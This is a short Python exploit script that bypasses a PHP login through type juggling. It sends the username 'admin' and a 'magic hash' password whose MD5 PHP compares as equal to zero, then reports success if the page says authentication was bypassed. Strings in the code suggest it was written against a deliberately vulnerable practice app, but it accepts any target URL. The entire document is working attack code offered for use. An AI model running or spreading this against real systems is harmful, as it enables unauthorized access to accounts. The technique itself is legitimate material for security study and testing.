import requests
import sys

def php_magic_bytes():
	print("[+] Returning php magic hashes whose md5 evaluate to 0")
	return "aabg7XSs"

def exploit(target):
	payload=php_magic_bytes()
	data={"username":"admin","password":payload,"login":"Login+%28Vulnerable%29"}
	url=target
	try:
		response=requests.post(url,data=data,timeout=5)
	except Exception as e:
		print("[-] Request failed.",e)
		return
	if "authentication bypassed" in response.text.lower():
		print("[+] Succesfully conducted php type juggling")
		print("="*100)
		print("[+] response content",response.content)
	else:
		print("[-] Not successfull")
if __name__ == "__main__":
	if len(sys.argv) != 2:
		print(f"[+] Usage python3 {sys.argv} http[s]://target.com")
		sys.exit(-1)
	target=sys.argv[1]
	exploit(target)
